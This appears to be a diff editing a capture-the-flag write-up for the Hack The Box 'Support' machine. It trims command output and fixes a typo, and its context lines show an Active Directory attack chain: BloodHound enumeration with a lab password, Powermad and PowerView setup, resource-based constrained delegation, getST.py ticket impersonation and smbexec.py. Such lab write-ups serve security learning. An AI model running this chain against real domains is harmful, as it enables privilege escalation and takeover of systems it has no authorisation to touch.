@@ -225,13 +225,6 @@ With some basic enumeration we can see nothing interesting. So I've decided to u
 
 ```powershell
 *Evil-WinRM* PS C:\Users\support\Downloads> upload SharpHound.exe
-Info: Uploading ./SharpHound.exe to C:\Users\support\Downloads\SharpHound.exe    
-
-                                                         
-Data: 1211048 bytes of 1211048 bytes copied
-
-Info: Upload successful!
-
 *Evil-WinRM* PS C:\Users\support\Downloads> ./SharpHound.exe --collectionmethods All --zipfilename bloodhound
 *Evil-WinRM* PS C:\Users\support\Downloads> download C:\Users\support\Downloads\20220804095517_bloodhound.zip /home/kali/Downloads/bloodhound.zip
 ```
@@ -240,20 +233,6 @@ Unfortunately, this doesn't work for me. BloodHound always gives "BAD JSON FILE"
 
 ```zsh
 $ bloodhound-python -v -u 'support' -p 'Ironside47pleasure40Watchful' -ns 10.10.11.174 -d support.htb -c All
-INFO: Found AD domain: support.htb
-INFO: Connecting to LDAP server: dc.support.htb
-INFO: Found 1 domains
-INFO: Found 1 domains in the forest
-INFO: Found 3 computers
-INFO: Connecting to LDAP server: dc.support.htb
-INFO: Found 21 users
-INFO: Found 53 groups
-INFO: Starting computer enumeration with 10 workers
-INFO: Querying computer: 
-INFO: Querying computer: Management.support.htb
-INFO: Querying computer: dc.support.htb
-INFO: Done in 00M 39S
-
 $ ll
 total 180K
  12K -rw-r--r--  1 kali kali  11K Aug  5 10:22  20220805102215_computers.json
@@ -299,17 +278,13 @@ On the start we upload necessary files to a machine and import powershell module
 
 ```powershell
 *Evil-WinRM* PS C:\Users\support\Documents> gci
-
-
     Directory: C:\Users\support\Documents
-
 
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
 -a----          8/5/2022   4:09 AM         135586 Powermad.ps1
 -a----          8/5/2022   3:32 AM         770279 PowerView.ps1
 -a----          8/5/2022   2:19 AM         441344 Rubeus.exe
-
 
 *Evil-WinRM* PS C:\Users\support\Documents> import-module ./Powermad.ps1
 *Evil-WinRM* PS C:\Users\support\Documents> import-module ./PowerView.ps1
@@ -346,8 +321,6 @@ Our next step is to configure the Resource-based Constrained Delegation with Pow
 msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
-
-
 ```
 
 Our last step is to get the ticket. We are using getST.py tool from impacket package here. It will request the ticket and save it as ccache, with -impersonate switch it requests the ticket on behalf other user (it will use S4U2Self/S4U2Proxy to request the ticket.). Then, we have to export a special variable "KRB5CCNAME" to specify the file with the ticket.
@@ -382,6 +355,6 @@ $ smbexec.py  support.htb/administrator@dc.support.htb -no-pass -k
 
 # Conclusion
 
-It was a really cool box. I've enjoyed it. I had several problems with privesc, I've tried to perform an attack with [Rubeus](https://github.com/GhostPack/Rubeus) tool, but the tickets haven't work. I think it's because of evil-winrm. Also I had a problem with decompiler, I couldn't re-compile the application and I think I was able to.
+It was a really cool box. I've enjoyed it. I had several problems with privesc, I've tried to perform an attack with [Rubeus](https://github.com/GhostPack/Rubeus) tool, but the tickets haven't worked. I think it's because of evil-winrm. Also I had a problem with decompiler, I couldn't re-compile the application and I think I was able to.
 
 Thank you for reading, I hope it was useful for you ❤️
